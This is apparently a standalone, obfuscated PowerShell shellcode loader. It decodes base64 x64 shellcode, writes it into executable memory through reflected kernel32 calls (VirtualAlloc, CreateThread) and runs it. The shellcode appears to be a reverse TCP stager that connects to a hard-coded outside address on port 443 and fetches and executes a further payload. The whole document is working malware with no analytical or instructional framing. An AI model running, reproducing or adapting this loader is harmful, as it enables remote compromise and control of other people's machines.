function bqP {
	Param ($kIpuh, $oXgAl)		
	$y5S3q = ([AppDomain]::CurrentDomain.GetAssemblies() | Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].Equals('System.dll') }).GetType('Microsoft.Win32.UnsafeNativeMethods')
	
	return $y5S3q.GetMethod('GetProcAddress', [Type[]]@([System.Runtime.InteropServices.HandleRef], [String])).Invoke($null, @([System.Runtime.InteropServices.HandleRef](New-Object System.Runtime.InteropServices.HandleRef((New-Object IntPtr), ($y5S3q.GetMethod('GetModuleHandle')).Invoke($null, @($kIpuh)))), $oXgAl))
}

function mYZPt {
	Param (
		[Parameter(Position = 0, Mandatory = $True)] [Type[]] $mbFB,
		[Parameter(Position = 1)] [Type] $yQ = [Void]
	)
	
	$lu = [AppDomain]::CurrentDomain.DefineDynamicAssembly((New-Object System.Reflection.AssemblyName('ReflectedDelegate')), [System.Reflection.Emit.AssemblyBuilderAccess]::Run).DefineDynamicModule('InMemoryModule', $false).DefineType('MyDelegateType', 'Class, Public, Sealed, AnsiClass, AutoClass', [System.MulticastDelegate])
	$lu.DefineConstructor('RTSpecialName, HideBySig, Public', [System.Reflection.CallingConventions]::Standard, $mbFB).SetImplementationFlags('Runtime, Managed')
	$lu.DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $yQ, $mbFB).SetImplementationFlags('Runtime, Managed')
	
	return $lu.CreateType()
}

[Byte[]]$fJ = [System.Convert]::FromBase64String("/EiD5PDozAAAAEFRQVBSUVZIMdJlSItSYEiLUhhIi1IgSItyUEgPt0pKTTHJSDHArDxhfAIsIEHByQ1BAcHi7VJBUUiLUiCLQjxIAdBmgXgYCwIPhXIAAACLgIgAAABIhcB0Z0gB0FCLSBhEi0AgSQHQ41ZI/8lBizSISAHWTTHJSDHArEHByQ1BAcE44HXxTANMJAhFOdF12FhEi0AkSQHQZkGLDEhEi0AcSQHQQYsEiEgB0EFYQVheWVpBWEFZQVpIg+wgQVL/4FhBWVpIixLpS////11JvndzMl8zMgAAQVZJieZIgeygAQAASYnlSbwCAAG7p7NxSEFUSYnkTInxQbpMdyYH/9VMiepoAQEAAFlBuimAawD/1WoKQV5QUE0xyU0xwEj/wEiJwkj/wEiJwUG66g/f4P/VSInHahBBWEyJ4kiJ+UG6maV0Yf/VhcB0Ckn/znXl6JMAAABIg+wQSIniTTHJagRBWEiJ+UG6AtnIX//Vg/gAflVIg8QgXon2akBBWWgAEAAAQVhIifJIMclBulikU+X/1UiJw0mJx00xyUmJ8EiJ2kiJ+UG6AtnIX//Vg/gAfShYQVdZaABAAABBWGoAWkG6Cy8PMP/VV1lBunVuTWH/1Un/zuk8////SAHDSCnGSIX2dbRB/+dYagBZScfC8LWiVv/V")
		
$n9Vz = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((bqP kernel32.dll VirtualAlloc), (mYZPt @([IntPtr], [UInt32], [UInt32], [UInt32]) ([IntPtr]))).Invoke([IntPtr]::Zero, $fJ.Length,0x3000, 0x40)
[System.Runtime.InteropServices.Marshal]::Copy($fJ, 0, $n9Vz, $fJ.length)

$rMoz_ = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((bqP kernel32.dll CreateThread), (mYZPt @([IntPtr], [UInt32], [IntPtr], [IntPtr], [UInt32], [IntPtr]) ([IntPtr]))).Invoke([IntPtr]::Zero,0,$n9Vz,[IntPtr]::Zero,0,[IntPtr]::Zero)
[System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((bqP kernel32.dll WaitForSingleObject), (mYZPt @([IntPtr], [Int32]))).Invoke($rMoz_,0xffffffff) | Out-Null
